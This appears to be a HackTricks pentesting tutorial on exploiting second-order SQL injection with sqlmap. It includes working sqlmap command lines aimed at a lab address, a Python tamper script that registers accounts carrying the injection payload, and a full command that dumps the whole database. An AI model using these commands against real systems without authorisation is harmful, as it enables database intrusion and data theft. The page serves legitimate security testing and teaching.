

<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>☁️ HackTricks Cloud ☁️</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>🐦 Twitter 🐦</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>🎙️ Twitch 🎙️</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>🎥 Youtube 🎥</strong></a></summary>

- Do you work in a **cybersecurity company**? Do you want to see your **company advertised in HackTricks**? or do you want to have access to the **latest version of the PEASS or download HackTricks in PDF**? Check the [**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)!

- Discover [**The PEASS Family**](https://opensea.io/collection/the-peass-family), our collection of exclusive [**NFTs**](https://opensea.io/collection/the-peass-family)

- Get the [**official PEASS & HackTricks swag**](https://peass.creator-spring.com)

- **Join the** [**💬**](https://emojipedia.org/speech-balloon/) [**Discord group**](https://discord.gg/hRep4RUj7f) or the [**telegram group**](https://t.me/peass) or **follow** me on **Twitter** [**🐦**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks_live)**.**

- **Share your hacking tricks by submitting PRs to the [hacktricks repo](https://github.com/carlospolop/hacktricks) and [hacktricks-cloud repo](https://github.com/carlospolop/hacktricks-cloud)**.

</details>


**SQLMap can exploit Second Order SQLis.**\
You need to provide:

* The **request** where the **sqlinjection payload** is going to be saved
* The **request** where the **payload** will be **executed**

The request where the SQL injection payload is saved is **indicated as in any other injection in sqlmap**. The request **where sqlmap can read the output/execution** of the injection can be indicated with `--second-url` or with `--second-req` if you need to indicate a complete request from a file.

**Simple second order example:**

```bash
#Get the SQL payload execution with a GET to a url
sqlmap -r login.txt -p username --second-url "http://10.10.10.10/details.php"

#Get the SQL payload execution sending a custom request from a file
sqlmap -r login.txt -p username --second-req details.txt
```

In several cases **this won't be enough** because you will need to **perform other actions** apart from sending the payload and accessing a different page.

When this is needed you can use a **sqlmap tamper**. For example the following script will register a new user **using sqlmap payload as email** and logout.

```python
#!/usr/bin/env python

import re
import requests
from lib.core.enums import PRIORITY
__priority__ = PRIORITY.NORMAL

def dependencies():
    pass

def login_account(payload):
    proxies = {'http':'http://127.0.0.1:8080'}
    cookies = {"PHPSESSID": "6laafab1f6om5rqjsbvhmq9mf2"}

    params = {"username":"asdasdasd", "email":payload, "password":"11111111"}
    url = "http://10.10.10.10/create.php"
    pr = requests.post(url, data=params, cookies=cookies, verify=False, allow_redirects=True, proxies=proxies)

    url = "http://10.10.10.10/exit.php"
    pr = requests.get(url, cookies=cookies, verify=False, allow_redirects=True, proxies=proxies)

def tamper(payload, **kwargs):
    headers = kwargs.get("headers", {})
    login_account(payload)
    return payload
```

A **SQLMap tamper is always executed before starting a injection try with a payload** **and it has to return a payload**. In this case we don't care about the payload but we care about sending some requests, so the payload isn't changed.

So, if for some reason we need a more complex flow to exploit the second order SQL injection like:

* Create an account with the SQLi payload inside the "email" field
* Logout
* Login with that account (login.txt)
* Send a request to execute the SQL injection (second.txt)

**This sqlmap line will help:**

```bash
sqlmap --tamper tamper.py -r login.txt -p email --second-req second.txt --proxy http://127.0.0.1:8080 --prefix "a2344r3F'" --technique=U --dbms mysql --union-char "DTEC" -a
##########
# --tamper tamper.py : Indicates the tamper to execute before trying each SQLipayload
# -r login.txt : Indicates the request to send the SQLi payload
# -p email : Focus on email parameter (you can do this with an "email=*" inside login.txt
# --second-req second.txt : Request to send to execute the SQLi and get the ouput
# --proxy http://127.0.0.1:8080 : Use this proxy
# --technique=U : Help sqlmap indicating the technique to use
# --dbms mysql : Help sqlmap indicating the dbms
# --prefix "a2344r3F'" : Help sqlmap detecting the injection indicating the prefix
# --union-char "DTEC" : Help sqlmap indicating a different union-char so it can identify the vuln
# -a : Dump all
```


<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>☁️ HackTricks Cloud ☁️</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>🐦 Twitter 🐦</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>🎙️ Twitch 🎙️</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>🎥 Youtube 🎥</strong></a></summary>

- Do you work in a **cybersecurity company**? Do you want to see your **company advertised in HackTricks**? or do you want to have access to the **latest version of the PEASS or download HackTricks in PDF**? Check the [**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)!

- Discover [**The PEASS Family**](https://opensea.io/collection/the-peass-family), our collection of exclusive [**NFTs**](https://opensea.io/collection/the-peass-family)

- Get the [**official PEASS & HackTricks swag**](https://peass.creator-spring.com)

- **Join the** [**💬**](https://emojipedia.org/speech-balloon/) [**Discord group**](https://discord.gg/hRep4RUj7f) or the [**telegram group**](https://t.me/peass) or **follow** me on **Twitter** [**🐦**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks_live)**.**

- **Share your hacking tricks by submitting PRs to the [hacktricks repo](https://github.com/carlospolop/hacktricks) and [hacktricks-cloud repo](https://github.com/carlospolop/hacktricks-cloud)**.

</details>


